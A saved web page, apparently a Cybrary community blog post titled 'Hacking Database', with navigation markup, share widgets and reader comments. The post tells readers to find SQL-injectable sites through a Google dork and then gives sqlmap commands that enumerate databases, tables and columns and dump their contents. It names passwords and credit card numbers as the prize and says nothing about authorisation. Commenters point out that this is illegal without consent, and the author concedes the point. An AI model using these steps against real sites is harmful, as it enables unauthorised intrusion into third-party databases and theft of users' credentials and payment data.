id="menu-item-120100" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-120100 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-paths/" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">CAREERS</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-120100 ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-119940" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-119940 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only"><span class="ubermenu-target-title ubermenu-target-text">Beginner</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-119940 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-259790" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259790 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/information-security-fundamentals/"><span class="ubermenu-target-title ubermenu-target-text">Information Security Fundamentals</span></a></li><li id="menu-item-259677" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259677 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/network-engineer/"><span class="ubermenu-target-title ubermenu-target-text">Network Engineer</span></a></li><li id="menu-item-259678" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259678 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/soc-analyst-level-1"><span class="ubermenu-target-title ubermenu-target-text">SOC Analyst</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-119941" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-119941 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only"><span class="ubermenu-target-title ubermenu-target-text">Intermediate</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-119941 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-179909" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-179909 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/soc-analyst-level-1"><span class="ubermenu-target-title ubermenu-target-text">SOC Analyst</span></a></li><li id="menu-item-259679" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259679 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/penetration-tester/"><span class="ubermenu-target-title ubermenu-target-text">Penetration Tester</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-119942" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-119942 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1 ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only"><span class="ubermenu-target-title ubermenu-target-text">Advanced</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-119942 ubermenu-submenu-type-auto ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-259680" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259680 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/cyber-security-engineer"><span class="ubermenu-target-title ubermenu-target-text">Cyber Security Engineer</span></a></li><li id="menu-item-179910" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-179910 ubermenu-item-auto ubermenu-item-unknown-[unk] ubermenu-item-level-2 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-path/penetration-tester/"><span class="ubermenu-target-title ubermenu-target-text">Penetration Tester</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-120103" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-120103 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/career-paths/"><span class="ubermenu-target-title ubermenu-target-text">View All</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-112461" class="ubermenu-item ubermenu-item-type-post_type ubermenu-item-object-page ubermenu-item-112461 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/find-cyber-security-talent/" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">HIRE</span></a></li><li id="menu-item-259131" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-259131 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto ubermenu-has-submenu-drop ubermenu-has-submenu-mega"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/business/enterprise" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">BUSINESS</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-259131 ubermenu-submenu-type-auto ubermenu-submenu-type-mega ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-259132" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259132 ubermenu-item-auto ubermenu-item-header ubermenu-item-level-1 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/business/"><span class="ubermenu-target-title ubermenu-target-text">Teams</span></a></li><li id="menu-item-259133" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-259133 ubermenu-item-auto ubermenu-item-header ubermenu-item-level-1 ubermenu-column ubermenu-column-auto"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/business/enterprise"><span class="ubermenu-target-title ubermenu-target-text">Enterprise</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li><li id="menu-item-198275" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-has-children ubermenu-item-198275 ubermenu-item-level-0 ubermenu-column ubermenu-column-auto ubermenu-has-submenu-drop ubermenu-has-submenu-flyout"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-live/" tabindex="0"><span class="ubermenu-target-title ubermenu-target-text">LIVE</span></a><ul class="ubermenu-submenu ubermenu-submenu-id-198275 ubermenu-submenu-type-flyout ubermenu-submenu-drop ubermenu-submenu-align-left_edge_item"><li id="menu-item-247262" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-247262 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/cybrary-live/"><span class="ubermenu-target-title ubermenu-target-text">Live Training Courses</span></a></li><li id="menu-item-239786" class="ubermenu-item ubermenu-item-type-custom ubermenu-item-object-custom ubermenu-item-239786 ubermenu-item-auto ubermenu-item-normal ubermenu-item-level-1"><a class="ubermenu-target ubermenu-item-layout-default ubermenu-item-layout-text_only" href="https://www.cybrary.it/catalog/?type=%22Cybrary%20Live%20Series%22"><span class="ubermenu-target-title ubermenu-target-text">Archived</span></a></li><li class="ubermenu-retractor ubermenu-retractor-mobile"><i class="fa fa-times"></i> Close</li></ul></li></ul></nav>
+<!-- End UberMenu -->
+                </div>
+                <!-- end dropdown-holder -->
+            </div>
+            <!-- end top-main-menu -->
+                </div>
+                <!-- end top-elements -->
+            </div>
+            <!-- end top-wrapper -->
+    <div class="clear"></div>
+
+        <a id="sticky-menu-logo" href="https://www.cybrary.it/" title="Cybrary"><img src="Hacking%20Database%20-%20Cybrary_files/Cyb_new_Logo-255x49.png" alt="logo" height="40"></a>
+        
+
+<div id="page-content-title"></div>        <div id="page-content">
+<div class="no-breadcrumbs-padding"></div>
+<style>
+#page-content{
+	padding:0px;
+}
+#wrapper-1{
+	background-color:#fff!important;
+}
+b{
+	color:#262530;
+}
+h1{
+	font-size:55px;
+	font-weight:100;
+	color:#fff!important;
+	margin:0px;
+	padding:0px;
+	font-family: 'Open Sans';
+}
+#page-content-title{
+	display:none;
+}
+@media only screen and (max-width: 1200px) and (min-width: 320px) {
+.open_sidepopup{display:none!important}
+}
+</style>
+<script>
+jQuery(document).ready(function(){
+	jQuery('span.tip').click(function(){
+		jQuery.post('/bin/tip_cybyte.php',{user:0, author:105542,postid:111478}).done(function(data){
+		if(data != "failure"){
+			var totaltips = jQuery('.numtips').html();
+			jQuery('.numtips').delay(100).fadeOut(100).fadeIn(100).html(''+(parseInt(totaltips) + 1));
+		}
+		else{
+			jQuery('.numtips').html('No Cybytes Avaliable, 0');
+		}
+		});
+	});
+});
+var cyb_channel = {};
+jQuery(document).scroll(function() {
+      var vsp = jQuery(this).scrollTop();
+      if ((vsp > 550) && (vsp_fired != 1)) {
+        jQuery('.open_sidepopup').css('visibility','visible').slideDown('fast');
+        var vsp_fired = 1;
+      }
+      else {
+        jQuery('.open_sidepopup').slideUp('fast');
+        vsp_fired = 0;
+      }
+});
+jQuery(document).ready(function(){
+   jQuery('.savedcontentbutton,.sidesavebutton').click(function(){
+        jQuery('.savedcontentbutton,.sidesavebutton').html('Saved');
+        jQuery('.savedcontentbutton,.sidesavebutton').unbind('click');
+      jQuery.post('/bin/save_content.php',{d:0, id:"0",u:"https://www.cybrary.it/0p3n/hacking-database/",postid:"111478",ct:"msc", pt:"Hacking Database"});
+        ga('send', { hitType: 'event',eventCategory: 'Saved Open',eventAction: 'Saved: https://www.cybrary.it/0p3n/hacking-database/',eventLabel: 'Saved: Hacking Database','transport': 'beacon'});
+   });
+});
+
+</script>
+<div class="open_headerdiv" style="background:url(https://www.cybrary.it/wp-content/uploads/2018/02/rb30.jpg);background-repeat:no-repeat;background-size:cover;background-position:center;"><div style="background:rgba(0,0,0,0.7);width:100%;height:100%;"></div><div class="open_headercontent"><div class="maincontent600"><h1 class="margin20">Hacking Database</h1><div class="row margin40"><div class="open_authoravatar roundavatar floatleft"><a href="https://www.cybrary.it/members/sidsui/" target="_blank" title="View Profile"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/d70f2ba13b0389b5228d069f699062f1" srcset="//www.gravatar.com/avatar/d70f2ba13b0389b5228d069f699062f1?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></a></div><div class="floatleft open_headerdetails font18 weight600"><div class="open_authorname"><a class="textwhite" href="https://www.cybrary.it/members/sidsui/" target="_blank" title="View Profile">Sahad Mk</a></div><div class="secondary1_text font14">February 21, 2018 | Views: 19853</div></div><div class="clear"></div></div><div class="row"><div class="open_header_buttondiv floatleft"><a class="bp-ajaxr"><div class="btn primarygreenbtn">Save</div></a></div><div class="open_header_buttondiv floatright"><a action="link/html-button-link.html" href="mailto:?Subject=Hacking Database on Cybrary&amp;body=Take a look at this great post that I found on Cybrary, and let me know what you think: https://www.cybrary.it/0p3n/hacking-database/"><div class="btn secondarygreenbtn emailbutton">Email</div></a></div><div class="clear"></div></div></div></div></div><div class="rnow_box" style="border-radius:0px!important;border:0px solid!important;"><h3>Begin Learning Cyber Security for FREE Now!</h3><a class="flat-custom-button bp-ajaxr" href="https://www.cybrary.it/register/" title="Free Registration">FREE REGISTRATION</a><a href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F" style="color:#A0D541;">Already a Member Login Here</a></div><div class="maincontent600 lineheight2 margin100 primary1_background"><div class="row"><div class="floatright"></div><div class="clear"></div></div><p><a href="https://www.cybrary.it/wp-content/uploads/2018/02/rb30.jpg" rel="attachment wp-att-111483"></a></p>
+<p>Hi dear hackers,</p>
+<p>Hacking database is a&nbsp;pretty cool thing you wanna do.Why 
+databases? Certainly its about the information it holds such as 
+passwords, credit card numbers even your girlfriend’s phone number. So 
+here I’m going to explain how can we hack into databases using sqlmap 
+which is based oSQLql injection. So you ready?</p>
+<p>Ok let’s begin.</p>
+<p>Before you want to break into a database of a site,we have to find a 
+website ensure whether it is vulnerable or not. You can use google dorks
+ for this.</p>
+<p>A. for example:<strong>inurl:index.php?id=1</strong> just go through a few sites and put ‘ at the end of theselected url.</p>
+<p><strong><cite class="_Rm">www.targetsite.com/index.php?id=1′</cite></strong></p>
+<p>If it returns an error, then it is possibly vulnerable to sql injection, say like:</p>
+<p><b>Warning</b>: include(include/.php) [<a href="http://www.ifen.it/function.include" class="external" rel="nofollow" target="_blank">function.include</a>]: failed to open stream: No such file or directory in <b>/index.php</b> on line <b>38 </b></p>
+<p>B.fireup sqlmap and enter the following commands:</p>
+<p><b>1.sqlmap -u targetsite.come/index.php?id=1 –dbs(It retrieves all database in the server)</b></p>
+<p><strong>2.sqlmap -u targetsite.come/index.php?id=1 -D dbname –tables(it retrieves all tables in dbname)</strong></p>
+<p><strong>3.sqlmap -u targetsite.come/index.php?id=1 -D dbname -T 
+tablename –columns(retrieves columns of&nbsp;&nbsp;&nbsp; tablename such
+ as id,username,password)</strong></p>
+<p><strong>4.sqlmap -u targetsite.come/index.php?id=1 -D dbname -T tablename -C columnname –dump</strong></p>
+<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 
+&nbsp;</strong> Then you will get table along with specified column names. Bingo!</p>
+<p>Happy hunting. Thank you.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<div class="clear"></div></div><div class="open_sidepopup boxshadow primary1_background" style="visibility: visible; display: block;"><div class="font14 weight600 textcenter margin10">Share with Friends</div><div class="open_sidepopup_socialicons"><div class="socialshare_vertical"><a class="cbsharec" data-url="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F" data-sharetype="f" data-shareid="111478"><img src="Hacking%20Database%20-%20Cybrary_files/sw_fblogo.png" alt="Facebook" title="Share this page to earn 1 Cybyte"></a><a class="cbsharec" data-url="https://twitter.com/share?url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F" data-sharetype="t" data-shareid="111478"><img src="Hacking%20Database%20-%20Cybrary_files/sw_twlogo.png" alt="Twitter" title="Tweet this page to earn 1 Cybyte"></a><a class="cbsharec" data-url="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F&amp;title=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F&amp;summary=&amp;source=" data-sharetype="l" data-shareid="111478"><img src="Hacking%20Database%20-%20Cybrary_files/sw_lilogo.png" alt="LinkedIn" title="Share this page to earn 1 Cybyte"></a><a class="cbsharec" data-url="mailto:?to=&amp;subject=Cybrary - Hacking Database&amp;body=https://www.cybrary.it/0p3n/hacking-database/" data-sharetype="e" data-shareid="111478"><img src="Hacking%20Database%20-%20Cybrary_files/sw_emlogo.png" alt="Email" title="Email this page to a friend to earn 1 Cybyte"></a></div></div></div><div class="maincontent600 margincenter margin100"><div class="row margin100"><div class="floatleft"><div class="margin20 weight600 textcenter">Use Cybytes and<br>Tip the Author!</div><div class="btn primaryorangebtn margin20 bp-ajaxr">Join</div></div><div class="floatright"><div class="margin20 weight600 textcenter">Share with Friends</div><div class="socialshare_horizontal"><a class="cbsharec socialsv" data-url="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F" data-sharetype="f" data-shareid=""><img src="Hacking%20Database%20-%20Cybrary_files/sw_fblogo.png" alt="Facebook" title="Share this page to earn 1 Cybyte"></a><a class="cbsharec socialsv" data-url="https://twitter.com/share?url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F" data-sharetype="t" data-shareid=""><img src="Hacking%20Database%20-%20Cybrary_files/sw_twlogo.png" alt="Twitter" title="Tweet this page to earn 1 Cybyte"></a><a class="cbsharec socialsv" data-url="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F&amp;title=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F&amp;summary=&amp;source=" data-sharetype="l" data-shareid=""><img src="Hacking%20Database%20-%20Cybrary_files/sw_lilogo.png" alt="LinkedIn" title="Share this page to earn 1 Cybyte"></a><a class="cbsharec socialsv" data-url="mailto:?to=&amp;subject=Cybrary - Hacking Database&amp;body=https://www.cybrary.it/0p3n/hacking-database/" data-sharetype="e" data-shareid=""><img src="Hacking%20Database%20-%20Cybrary_files/sw_emlogo.png" alt="Email" title="Email this page to a friend to earn 1 Cybyte"></a></div></div><div class="clear"></div></div><div class="font20 weight500 textcenter margin20">Ready to share your knowledge and expertise?</div><div class="open_content_buttondiv"><a href="https://www.cybrary.it/cybrary-0p3n/contribute/" title="Submit your own work to 0P3N"><div class="btn primaryorangebtn">Submit to 0P3N</div></a></div><div class="clear"></div></div><div class="maincontent600 margincenter" id="comment">
+
+
+<!-- You can start editing from here: -->
+
+            <h5 id="comments">6 Comments</h5>
+            <div class="clear"></div>
+            <ol class="commentlist">
+
+        <li class="comment byuser comment-author-jmcedric even thread-even depth-1" id="li-comment-23478">             <div id="comment-23478">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/f183e30a652c3f2c19b333a28aae2344" srcset="//www.gravatar.com/avatar/f183e30a652c3f2c19b333a28aae2344?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/jmcedric/" rel="external nofollow" class="url">jmcedric</a></div>
+<span class="the-comment-time-and-date"><span class="time">1:51 am</span> on <a class="comment-date" href="#comment-23478" title="February 22, 2018">February 22, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>Thanks! Make sure to include all the consequences of doing this for your future post. Happy hacking!</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+</li><!-- #comment-## -->
+
+        <li class="comment byuser comment-author-simasj odd alt thread-odd thread-alt depth-1" id="li-comment-23456">             <div id="comment-23456">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/f5fd4db2ac58d862d3a33edc74639a45" srcset="//www.gravatar.com/avatar/f5fd4db2ac58d862d3a33edc74639a45?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/simasj/" rel="external nofollow" class="url">Simas J</a></div>
+<span class="the-comment-time-and-date"><span class="time">3:03 am</span> on <a class="comment-date" href="#comment-23456" title="February 21, 2018">February 21, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>It not hacking, it scriptie kiddie’s type of using tool without 
+understanding how it works (just give a command to black box and get the
+ result). But to be real hacker you have to understand what is sql 
+injection, how this sqlmap tool gets all the databases, column names, 
+etc.</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+<ul class="children">
+
+        <li class="comment byuser comment-author-sidsui bypostauthor even depth-2" id="li-comment-23458">             <div id="comment-23458">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/d70f2ba13b0389b5228d069f699062f1" srcset="//www.gravatar.com/avatar/d70f2ba13b0389b5228d069f699062f1?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/sidsui/" rel="external nofollow" class="url">Sahad Mk</a></div>
+<span class="the-comment-time-and-date"><span class="time">3:19 am</span> on <a class="comment-date" href="#comment-23458" title="February 21, 2018">February 21, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>I know bro,it just for beginners and just about automated hacking…did
+ i told you teaching about sql injection?how can somebody hack a 
+database using SqlMap.. that’s all I considered.I just wanted to help 
+guys who wants to know about SqlMap and how to use it.No one said a 
+great hacker should be use SqlMap or Know about it.</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+<ul class="children">
+
+        <li class="comment byuser comment-author-solarflare odd alt depth-3" id="li-comment-23459">             <div id="comment-23459">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/6e78fd5fef3a5f1d7519b1830ee8a305" srcset="//www.gravatar.com/avatar/6e78fd5fef3a5f1d7519b1830ee8a305?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/solarflare/" rel="external nofollow" class="url">Solarflare</a></div>
+<span class="the-comment-time-and-date"><span class="time">4:57 am</span> on <a class="comment-date" href="#comment-23459" title="February 21, 2018">February 21, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>From the opposite side of the coin, you are ‘teaching’ people to run 
+scans for vulnerable websites without any understanding of what it means
+ or what the dangers are. Doing this on a website without their say so 
+is technically illegal. Someone could end up doing damage to a site and 
+end up in hot water if they use this as a starting point and then carry 
+on in order to try to learn.</p>
+<p>Pointing a tool at the open internet is NOT the way to learn. You 
+should be advocating that people set up a sandboxed environment for this
+ and use ready made vulnerable webapps and websites (things like 
+metasploitable) and either learn by doing, by checking out free 
+resources or a mixture of both.</p>
+<p>I’m not having a go at you for giving a quick view of sqlmap, but you
+ shouldn’t be saying look at google and target a site you find there.</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+<ul class="children">
+
+        <li class="comment byuser comment-author-sidsui bypostauthor even depth-4" id="li-comment-23460">             <div id="comment-23460">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/d70f2ba13b0389b5228d069f699062f1" srcset="//www.gravatar.com/avatar/d70f2ba13b0389b5228d069f699062f1?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/sidsui/" rel="external nofollow" class="url">Sahad Mk</a></div>
+<span class="the-comment-time-and-date"><span class="time">5:50 am</span> on <a class="comment-date" href="#comment-23460" title="February 21, 2018">February 21, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>For God why you people over reacting..I missed to mention that doing such thing is illegal without consent of target.</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+</li><!-- #comment-## -->
+
+        <li class="comment byuser comment-author-sidsui bypostauthor odd alt depth-4" id="li-comment-23461">             <div id="comment-23461">
+                <div class="comment-meta">
+                                        <div class="avatar-wrapper level-3">
+<div style="width:52px;"><img alt="" src="Hacking%20Database%20-%20Cybrary_files/d70f2ba13b0389b5228d069f699062f1" srcset="//www.gravatar.com/avatar/d70f2ba13b0389b5228d069f699062f1?s=96&amp;r=pg&amp;d=https%3A%2F%2Fwww.cybrary.it%2Fwp-content%2Fthemes%2Fcybrary%2Fimg%2Fdefault-gravatar.jpg 2x" class="avatar avatar-96 photo" width="96" height="96"></div>                    </div>
+                    <div class="commentmetadata">
+                        <div class="author"><a href="https://www.cybrary.it/members/sidsui/" rel="external nofollow" class="url">Sahad Mk</a></div>
+<span class="the-comment-time-and-date"><span class="time">5:56 am</span> on <a class="comment-date" href="#comment-23461" title="February 21, 2018">February 21, 2018</a></span>                    </div>
+                </div>
+
+                <div class="commenttext">
+<p>I accept all criticism…but you don’t have to brood over it.</p>
+                    <div class="reply">
+<a rel="nofollow" class="comment-reply-login" href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">Log in to Reply</a>                    </div>
+                </div>
+            </div>
+
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+            </ol>
+            <div class="clear"></div>
+            
+            
+
+            
+            <div id="respond">
+                <h5>Comment on This</h5>
+                <div class="cancel-comment-reply">
+                    <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://www.cybrary.it/0p3n/hacking-database/#respond" style="display:none;">Click here to cancel reply.</a></small>
+                </div>
+
+<p>You must be <a href="https://www.cybrary.it/wp-login.php?redirect_to=https%3A%2F%2Fwww.cybrary.it%2F0p3n%2Fhacking-database%2F">logged in</a> to post a comment.</p>            </div><!-- end respond -->
+            
+<div class="clear"></div></div><div class="openrelatedreads"><div class="maincontent600 openpostcontent" style="	max-width:625px;
+		margin:0px auto;"><div class="openrelatedreadstitle" style="margin-left:2%;">Related Reads</div><a style="color:#000;" href="https://www.cybrary.it/0p3n/netflix-account-takeover-vulnerability/" class="external" target="_self">
